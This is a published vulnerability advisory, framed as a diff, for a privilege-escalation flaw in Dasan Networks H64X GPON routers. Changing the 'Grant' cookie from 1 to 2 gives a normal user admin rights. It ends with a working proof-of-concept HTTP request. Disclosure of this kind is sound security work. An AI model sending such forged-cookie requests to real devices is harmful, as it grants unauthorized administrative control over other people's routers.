@@ -1,0 +1,60 @@
+Dasan Networks GPON ONT WiFi Router H64X Series Privilege Escalation
+
+
+Vendor: Dasan Networks
+Product web page: http://www.dasannetworks.com | http://www.dasannetworks.eu
+Affected version: Model: H640GR-02
+                         H640GV-03
+                         H640GW-02
+                         H640RW-02
+                         H645G
+               Firmware: 2.77-1115
+                         2.76-9999
+                         2.76-1101
+                         2.67-1070
+                         2.45-1045
+
+Summary: H64xx is comprised of one G-PON uplink port and four ports
+of Gigabit Ethernet downlink supporting 10/100/1000Base-T (RJ45). It
+helps service providers to extend their core optical network all the
+way to their subscribers, eliminating bandwidth bottlenecks in the
+last mile. H64xx is integrated device that provide the high quality
+Internet, telephony service (VoIP) and IPTV or OTT content for home
+or office. H64xx enable the subscribers to make a phone call whose
+quality is equal to PSTN at competitive price, and enjoy the high
+quality resolution live video and service such as VoD or High Speed
+Internet.
+
+Desc: The application suffers from a privilege escalation vulnerability.
+A normal user can elevate his/her privileges by changing the Cookie 'Grant'
+from 1 (user) to 2 (admin) gaining administrative privileges and revealing
+additional functionalities or additional advanced menu settings.
+
+Tested on: Server: lighttpd/1.4.31
+           Server: DasanNetwork Solution
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5423
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5423.php
+
+
+19.05.2017
+
+--
+
+
+Change cookie Grant=1 (user) to Grant=2 (admin):
+------------------------------------------------
+
+GET /cgi-bin/index.cgi HTTP/1.1
+Host: 192.168.0.1:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Bond-James-Bond/007
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.8,mk;q=0.6
+Cookie: Grant=2; Language=macedonian; silverheader=3c
+Connection: close
